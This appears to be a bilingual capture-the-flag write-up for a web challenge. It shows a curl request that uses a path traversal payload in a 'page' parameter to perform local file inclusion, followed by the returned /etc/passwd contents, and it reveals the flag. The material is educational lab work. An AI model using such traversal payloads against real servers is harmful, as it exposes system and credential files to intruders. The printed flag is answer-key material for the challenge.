# La Faille Inssoumise

## FR

Un nouveau membre de l'infosec se lance dans le hacking, il a commencé à développer son site de veille.
Retrouvez le nom de l'utilisateur de son système, et montrez lui qu'il n'est pas sécurisé !

## EN

A new member of infosec start to do hacking and develop his news website.
Find the system username to show him how his website is unsecure!

https://lfi.flag4all.sh

Auteur : K_lfa (BZHack / ESDAcademy)


https://lfi.flag4all.sh

## Solve

page link to `https://lfi.flag4all.sh/?page=page1.php`
Looks like some LFI (Local File Inclusion)
```
└─$ curl 'https://lfi.flag4all.sh/?page=../../../../../etc/passwd'                                                                                                                        

<html>
    <head>
            <title> Un site de hacker </title>
    </head>
    <body>
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
Flag{L0c4l_F1l3_1nclusi0n_L3AK}:x:1000:100::/home/Flag{L0c4l_F1l3_1nclusi0n_L3AK}:/bin/sh

                        <center><a href=http://lfi.flag4all.sh/>Retour</a></center></br></br>
                        <center>Pour la bonne cause des hackers, Utilisez la navigation privée.</center>
```
